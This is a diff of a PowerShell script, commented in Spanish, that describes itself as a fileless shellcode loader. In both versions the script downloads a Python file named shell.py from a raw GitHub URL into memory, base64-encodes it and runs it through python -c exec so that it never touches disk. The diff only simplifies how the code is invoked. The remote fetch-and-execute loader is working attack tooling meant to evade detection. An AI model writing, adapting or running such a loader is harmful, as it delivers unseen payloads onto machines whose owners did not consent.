@@ -1,18 +1,17 @@
-param(
-    [Parameter(Mandatory=$true)]
-    [string]$BinPath
-)
-
 cls
-Write-Host "[+] Iniciando shellcode loader (fileless)" -ForegroundColor Cyan
+Write-Host "[+] Ejecutando shellcode loader (Python fileless)..." -ForegroundColor Cyan
 
-$PythonScriptUrl = "https://raw.githubusercontent.com/AL4AROX/CodeBin/main/shell.py"
+# URL de tu script Python en GitHub (RAW)
+$url = "https://raw.githubusercontent.com/AL4AROX/CodeBin/refs/heads/main/shell.py"
 
-# Descargar código Python
-$pythonCode = (Invoke-WebRequest -Uri $PythonScriptUrl -UseBasicParsing).Content
+# Descargar el código Python a memoria
+$code = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
 
-# Ejecutar Python con el código directamente (sin archivo)
-# Usamos -- para pasar argumentos después del comando -c
-$encodedCode = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($pythonCode))
-$command = "python -c `"import base64; exec(base64.b64decode('$encodedCode').decode('utf-8'))`" `"$BinPath`""
-Invoke-Expression $command
+# Codificar a Base64 para pasarlo a python -c sin problemas
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($code)
+$b64 = [Convert]::ToBase64String($bytes)
+
+# Ejecutar Python con el código decodificado (sin tocar el disco)
+python -c "import base64; exec(base64.b64decode('$b64').decode('utf-8'))"
+
+Write-Host "[+] Proceso finalizado." -ForegroundColor Cyan
